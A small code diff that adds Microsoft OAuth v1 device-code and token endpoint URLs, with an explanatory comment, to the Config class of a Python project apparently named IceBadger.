@@ -23,6 +23,10 @@ class Config:
     
     DEVICE_CODE_URL = os.getenv("ICEBADGER_DEVICE_CODE_URL", f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode")
     TOKEN_URL = os.getenv("ICEBADGER_TOKEN_URL", f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token")
+    # v1 endpoints — proven working for personal (consumer) accounts with the
+    # Office first-party client and resource=https://graph.windows.net.
+    DEVICE_CODE_URL_V1 = "https://login.microsoftonline.com/common/oauth2/devicecode"
+    TOKEN_URL_V1 = "https://login.microsoftonline.com/common/oauth2/token"
     
     # Polling
     POLL_INTERVAL = int(os.getenv("ICEBADGER_POLL_INTERVAL", 5))
